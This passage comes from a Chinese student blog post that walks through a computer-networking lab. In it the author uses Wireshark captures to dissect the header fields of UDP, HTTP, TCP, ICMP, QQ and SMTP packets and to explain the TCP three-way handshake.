alt="P3hZX6.md.png"></a><br>可以清楚分析出他的首部信息，首部长为20字节，还有标识位5428，3位没有设置的标志位以及总长度偏移量，TTL为64，协议字段17，代表了上层使用UDP，下面就是源IP为192.168.1.101，目的IP为140.207.62.105<br>再往下分析就是数据链路层了，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hmnK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hmnK.md.png" alt="P3hmnK.md.png"></a></p><p><strong>http数据包详细分析：</strong><br><a href="https://imgchr.com/i/P3htnf" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3htnf.md.png" alt="P3htnf.md.png"></a><br>对于http数据进行分析，发现还是离不开五层协议，物理层，数据链路层，网路层，传输层，还有应用层，层次结构十分明显，这一次应用层以http报文显示，里面传递的的东西很明确，通过GET方式访问网站资源，访问的主机名为pub.idqqimg.com,还有其他的一些浏览器相关的信息等等。<br><a href="https://imgchr.com/i/P3hwNQ" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hwNQ.md.png" alt="P3hwNQ.md.png"></a><br> 下面一层是TCP，可以看出TCP首部信息，我们也可以从另一个方面推出http协议使用的运输层协议是tcp，源端口为18122，目的端口为80，还有它的序号以及确认信号，还可以看到标志位Flags，窗口大小为32768，首部长度为20，检验和是0x0dfc,紧急指针Urgent pointer置0<br> <a href="https://imgchr.com/i/P3hD9s" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hD9s.md.png" alt="P3hD9s.md.png"></a><br>再看IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识633，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hscq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hscq.md.png" alt="P3hscq.md.png"></a><br>分析数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hcuV" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hcuV.md.png" alt="P3hcuV.md.png"></a></p><p><strong>TCP包详细分析：</strong><br><a href="https://imgchr.com/i/P3h2HU" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h2HU.md.png" alt="P3h2HU.md.png"></a><br>分析TCP同样可以看出TCP首部信息，源端口为18122，目的端口为80，还有它的序号以及确认<br>信号，还可以看到标志位Flags，窗口大小为65535，首部长度为20，检验和是0x16eb,紧急指针Urgent pointer置0<br>IP层的内容，可以清楚分析出他的首部信息，版本号为4，首部长为20字节，还有标识631，3位没有设置的标志位Flags以及总长度偏移量，TTL为64，协议字段6，代表了上层使用TCP，下面就是源IP为192.168.1.101，目的IP为157.0.149.41<br><a href="https://imgchr.com/i/P3hh4J" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hh4J.md.png" alt="P3hh4J.md.png"></a></p><p>数据链路层，里面的信息也很清楚，把源MAC地址还有目的MAC地址显示出来，并且上层IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3h5C9" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3h5C9.md.png" alt="P3h5C9.md.png"></a></p><p><strong>ICMP包详细分析：</strong><br>使用icmp过滤相关的报文，分析根据报文格式分析icmp包里面的内容，Type显示8表明这是一个请求报文<br><img src="https://s1.ax1x.com/2018/07/20/P3hog1.png" alt="P3hog1.png"><br>分析网络层和数据链路层跟前面几次没什么区别，源IP为192.168.1.101，目的IP为192.168.1.100，IP首部为20字节，IP类型为IPv4，源MAC地址:74:c3:30:12:e6:f4,目的MAC地址:c8:ff:28:28:7d:49<br><a href="https://imgchr.com/i/P3hHu6" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hHu6.md.png" alt="P3hHu6.md.png"></a><br><a href="https://imgchr.com/i/P3hbDK" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3hbDK.md.png" alt="P3hbDK.md.png"></a></p><p><strong>分析QQ的报文：</strong><br><a href="https://imgchr.com/i/P34ZCj" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34ZCj.md.png" alt="P34ZCj.md.png"></a><br>对于QQ的包可以得出来应用层是使用了OICQ的协议，里面包含了QQ号的信息以及加密过了的数据，使用的是UDP的传输协议，源端口是8000，目的端口是4026<br>对于网络层以及数据链路层是一样的分析过程，源IP是140.207.62.150，目的IP是192.168.1.101，传输层使用的是UDP，TTL是55<br><a href="https://imgchr.com/i/P34m2n" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34m2n.md.png" alt="P34m2n.md.png"></a></p><p><strong>对邮件包分析：</strong><br><a href="https://imgchr.com/i/P34nvq" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P34nvq.md.png" alt="P34nvq.md.png"></a><br>可以看得出来邮件传送有一个建立连接的过程，从哪里发的并且在哪里接收都有对应的邮箱，建立连接的密码用base64加密过了，看下层运输层是使用TCP建立连接的，目的端口是17379，源端口号25，窗口值138，序号是454，IP版本是IPv4，源IP是192.168.1.101，  目的IP是123.125.50.138</p><h3 id="实验内容第三点"><a href="#实验内容第三点" class="headerlink" title="实验内容第三点"></a>实验内容第三点</h3><p>访问网站<code>www.souci.li</code>,过滤http然后追踪tcp流就可以看见http协议工作的大概过程(在这之前应该还得通过DNS去解析域名，你会发现这个包过滤DNS会发现把域名转换成IP的过程)，然后就是封装http请求数据包，封装成tcp包，建立tcp连接（三报文握手在HTTP工作开始 之前，客户机（Web浏览器）首先要通过网络与服务器建立连接，该连接是通过TCP来完成的，客户端发送请求，服务器响应，服务器关闭tcp连接<br><a href="https://imgchr.com/i/P35j1A" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35j1A.md.png" alt="P35j1A.md.png"></a><br><a href="https://imgchr.com/i/P35v6I" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P35v6I.md.png" alt="P35v6I.md.png"></a><br>分析三报文握手的过程：<br><strong>第一次报文握手</strong><br><a href="https://imgchr.com/i/P3Ip0f" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Ip0f.md.png" alt="P3Ip0f.md.png"></a><br>客户端发送一个TCP，标志位为SYN，序列号为0， 代表客户端请求建立连接</p><p><strong>第二次握手的数据包</strong><br>服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的I S N加1,即0+1=1, 如下图<br><a href="https://imgchr.com/i/P3I978" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3I978.md.png" alt="P3I978.md.png"></a></p><p><strong>第三次握手的数据包</strong><br>客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK 的序号字段+1,放在确定字段中发送给对方,如下图:<br><a href="https://imgchr.com/i/P3Iitg" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/07/20/P3Iitg.md.png" alt="P3Iitg.md.png"></a><br>就这样通过了TCP三报文握手，建立了连接</p><p>小小回顾，感觉废话太多，emmm。。。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;总算有时间把计网实验的学习过程记录一下了。也当做是一个复习的过程，过程太长，分两篇博客写吧。&lt;br&gt;
    
    </summary>
    
      <category term="计算机网路" scheme="0verwatch.top/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
    
      <category term="计算机网路" scheme="0verwatch.top/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E8%B7%AF/"/>
    
  </entry>
  
</feed>
